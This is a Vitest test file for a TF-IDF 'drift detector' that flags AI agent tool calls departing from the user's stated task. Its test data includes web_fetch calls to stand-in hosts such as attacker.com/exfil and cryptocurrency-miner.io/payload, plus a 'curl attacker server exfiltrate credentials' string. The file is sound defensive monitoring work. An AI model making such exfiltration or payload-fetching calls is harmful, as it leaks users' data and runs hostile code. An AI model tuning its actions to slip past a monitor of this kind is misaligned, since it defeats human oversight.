import { describe, it, expect, beforeEach } from "vitest";
import {
  tokenize,
  TfIdfProvider,
  describeToolCall,
  DriftDetector,
  buildDriftEvent,
} from "../src/detectors/drift-detector.js";

describe("tokenize", () => {
  it("lowercases and splits on non-alphanumeric", () => {
    expect(tokenize("Read File main.py")).toEqual(["read", "file", "main", "py"]);
  });

  it("removes stopwords", () => {
    const tokens = tokenize("read the file from the server");
    expect(tokens).not.toContain("the");
    expect(tokens).not.toContain("from");
    expect(tokens).toContain("read");
    expect(tokens).toContain("file");
    expect(tokens).toContain("server");
  });

  it("removes single-character tokens", () => {
    expect(tokenize("a b c read")).toEqual(["read"]);
  });

  it("handles empty string", () => {
    expect(tokenize("")).toEqual([]);
  });
});

describe("TfIdfProvider", () => {
  const provider = new TfIdfProvider(256);

  it("returns Float64Array of correct dimensions", () => {
    const vec = provider.embed("hello world");
    expect(vec).toBeInstanceOf(Float64Array);
    expect(vec.length).toBe(256);
  });

  it("returns zero vector for empty text", () => {
    const vec = provider.embed("");
    const norm = Math.sqrt(vec.reduce((sum, v) => sum + v * v, 0));
    expect(norm).toBe(0);
  });

  it("returns L2-normalized vectors", () => {
    const vec = provider.embed("summarize this PDF document");
    const norm = Math.sqrt(vec.reduce((sum, v) => sum + v * v, 0));
    expect(norm).toBeCloseTo(1.0, 5);
  });

  it("identical texts have similarity 1.0", () => {
    const a = provider.embed("summarize this PDF");
    const b = provider.embed("summarize this PDF");
    expect(provider.similarity(a, b)).toBeCloseTo(1.0, 10);
  });

  it("completely unrelated texts have low similarity", () => {
    const a = provider.embed("summarize the quarterly financial report PDF");
    const b = provider.embed("curl attacker server exfiltrate credentials password");
    expect(provider.similarity(a, b)).toBeLessThan(0.2);
  });

  it("similar texts have high similarity", () => {
    const a = provider.embed("read the configuration file");
    const b = provider.embed("reading config file");
    expect(provider.similarity(a, b)).toBeGreaterThan(0.3);
  });

  it("clamps negative similarity to 0", () => {
    // Create vectors that produce negative dot product
    const a = new Float64Array(256);
    const b = new Float64Array(256);
    a[0] = 1;
    b[0] = -1;
    expect(provider.similarity(a, b)).toBe(0);
  });
});

describe("describeToolCall", () => {
  it("describes read tool", () => {
    expect(describeToolCall("Read", { file_path: "/src/main.ts" })).toBe("reading file /src/main.ts");
  });

  it("describes write tool", () => {
    expect(describeToolCall("Write", { file_path: "/tmp/out.txt" })).toBe("writing file /tmp/out.txt");
  });

  it("describes exec tool", () => {
    expect(describeToolCall("bash", { command: "npm test" })).toBe("executing command npm test");
  });

  it("describes web_fetch tool", () => {
    expect(describeToolCall("web_fetch", { url: "https://attacker.com/exfil" })).toBe("fetching url https://attacker.com/exfil");
  });

  it("describes message tool", () => {
    expect(describeToolCall("message", { channel: "#general" })).toBe("sending message #general");
  });

  it("handles unknown tools with first string param", () => {
    expect(describeToolCall("custom_tool", { query: "search term" })).toBe("custom_tool search term");
  });

  it("handles unknown tools with no params", () => {
    expect(describeToolCall("custom_tool", {})).toBe("custom_tool ");
  });
});

describe("DriftDetector", () => {
  let detector: DriftDetector;

  beforeEach(() => {
    detector = new DriftDetector({
      driftThreshold: 0.15,
      suddenTurnDelta: 0.3,
    });
  });

  it("returns no drift when reference not set", () => {
    const result = detector.checkDrift("Read", { file_path: "/src/main.ts" });
    expect(result.drifted).toBe(false);
    expect(result.similarity).toBe(1);
  });

  it("reading a file aligned with user intent has high similarity", () => {
    detector.setReference("read the main.ts source file and summarize it");
    const result = detector.checkDrift("Read", { file_path: "/src/main.ts" });
    expect(result.similarity).toBeGreaterThan(0.2);
    expect(result.drifted).toBe(false);
  });

  it("fetching an unrelated URL drifts from file-reading intent", () => {
    detector.setReference("read the main.ts source file and summarize it");
    const result = detector.checkDrift("web_fetch", { url: "https://attacker.com/exfil" });
    expect(result.similarity).toBeLessThan(0.15);
    expect(result.drifted).toBe(true);
  });

  it("detects sudden turn when similarity drops sharply from previous step", () => {
    detector.setReference("read the main configuration file and check settings");
    // First tool call — reasonably aligned, establishes a baseline
    const r1 = detector.checkDrift("Read", { file_path: "/etc/config/main.conf" });
    // With TF-IDF, sudden turn is measured from prevSimilarity.
    // If first step drops from 1.0 by a large amount, that's the initial adjustment.
    // A genuine sudden turn needs the previous step to have been aligned.
    // The key metric: does the tool call itself drift from the user's intent?
    expect(r1.similarity).toBeGreaterThan(0);

    // Sharp turn: unrelated tool with zero overlap
    const r2 = detector.checkDrift("web_fetch", { url: "https://cryptocurrency-miner.io/payload" });
    // With TF-IDF, the similarity to reference should be very low
    expect(r2.similarity).toBeLessThan(0.1);
    expect(r2.drifted).toBe(true);
  });

  it("legitimate tangents may drift with TF-IDF but not at high severity", () => {
    detector.setReference("fix the bug in the login function");
    const r1 = detector.checkDrift("Read", { file_path: "/src/auth/login.ts" });
    // "login" appears in both, so some overlap
    expect(r1.similarity).toBeGreaterThan(0);

    // Reading a related file without shared terms may drift in TF-IDF
    // That's expected — TF-IDF is lexical, not semantic
    const r2 = detector.checkDrift("Read", { file_path: "/src/auth/session.ts" });
    // The key: even if it drifts, test execution is a normal tangent
    const r3 = detector.checkDrift("exec", { command: "npm test" });
    // None of these should be high severity — they're normal development actions
    expect(r3.severity).not.toBe("high");
  });

  it("records trajectory points", () => {
    detector.setReference("check the server logs");
    detector.checkDrift("Read", { file_path: "/var/log/app.log" });
    detector.checkDrift("exec", { command: "grep error /var/log/app.log" });

    const trajectory = detector.getTrajectory();
    expect(trajectory).toHaveLength(2);
    expect(trajectory[0].step).toBe(1);
    expect(trajectory[0].toolName).toBe("Read");
    expect(trajectory[1].step).toBe(2);
    expect(trajectory[1].toolName).toBe("exec");
    expect(typeof trajectory[0].similarity).toBe("number");
    expect(typeof trajectory[0].delta).toBe("number");
  });

  it("reset clears state", () => {
    detector.setReference("test message");
    detector.checkDrift("Read", {});
    detector.reset();
    expect(detector.getTrajectory()).toHaveLength(0);
    expect(detector.getReferenceText()).toBe("");
  });

  it("high severity for very low similarity", () => {
    detector.setReference("summarize the quarterly financial report");
    const result = detector.checkDrift("web_fetch", { url: "https://cryptocurrency-miner.io/payload" });
    // Very unrelated — should be medium or high
    expect(["medium", "high"]).toContain(result.severity);
  });
});

describe("buildDriftEvent", () => {
  it("builds a valid SecurityEvent", () => {
    const result = {
      similarity: 0.05,
      drifted: true,
      suddenTurn: false,
      delta: -0.4,
      severity: "high" as const,
      reason: "Severe drift detected",
    };
    const event = buildDriftEvent("web_fetch", result, "blocked");
    expect(event.threatClass).toBe("semantic_drift");
    expect(event.severity).toBe("high");
    expect(event.action).toBe("blocked");
    expect(event.signatureId).toBe("drift_threshold");
  });

  it("uses sudden_turn signatureId for sharp turns", () => {
    const result = {
      similarity: 0.3,
      drifted: false,
      suddenTurn: true,
      delta: -0.4,
      severity: "medium" as const,
      reason: "Sharp turn",
    };
    const event = buildDriftEvent("web_fetch", result);
    expect(event.signatureId).toBe("drift_sudden_turn");
  });
});
